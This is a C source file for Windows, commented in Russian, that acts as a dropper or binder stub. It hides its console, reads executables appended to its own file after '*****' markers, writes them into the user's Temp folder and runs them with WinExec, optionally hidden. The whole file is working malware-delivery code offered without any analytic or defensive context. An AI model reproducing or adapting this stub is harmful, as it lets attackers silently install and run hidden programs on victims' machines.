#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

char crypt(char key, char data)
{
	return data^key;
}
int main(int argc, char * argv[]) {
	FreeConsole();	//скрываем консоль
    char buff[100];	//буфер для конконации
    DWORD dw=100;
	char buf1 = 'f';
    char buf;	//буфер для символов
    int i=0;	//счётчик
    int count=0;
    int trig=0;
	char atributes=0;
    char users[11] = "C:\\Users\\";
    char path[MAX_PATH];
    char first[MAX_PATH];
    char next[24] = "\\AppData\\Local\\Temp\\";
    GetUserName(buff, &dw);
    snprintf(path, sizeof path, "%s%s%s", users, buff, next );	//получаем путь в C:\Users\username\AppData\local\Temp
    FILE *f1, *f2;	//дискрипторы файлов
    f1 = fopen(argv[0], "rb");
    while(!feof(f1))
    {
    	if(fread(&buf, 1, sizeof(buf), f1)>0)
    	{
			if(trig==3)
			{
				memset(first, 0, sizeof first);
				snprintf(first, sizeof first, "%s%s", path, buff);
				f2 = fopen(first, "wb");
				trig++;
				count=0;
			}
			if(trig==4)
			{
				buf1=buf;
				fwrite(&buf1, sizeof(buf), 1, f2);
			}
			if(trig==2)
			{
				if(buf != '*')
				{
					buff[count]=buf;
					count++;
				}
			}
			if(trig==1) 
			{
				atributes = buf;
				trig++;
				memset(buff, 0, 100);
			}
    		if(buf=='*') i++;
			else i = 0;
			if(i==5) trig++; 
			if(trig==5)
			{
				fclose(f2);
				switch(atributes)
				{
					case (char)(0) : WinExec(first, 0);
					case (char)(1) : WinExec(first, 1);
				}
				trig=1;
			}
		}
	}
	fclose(f1);
	fclose(f2);
				switch(atributes)
				{
					case (char)(0) : WinExec(first, 0);
					case (char)(1) : WinExec(first, 1);
				}

    getchar();
	return EXIT_SUCCESS;	//завершение программы
	}
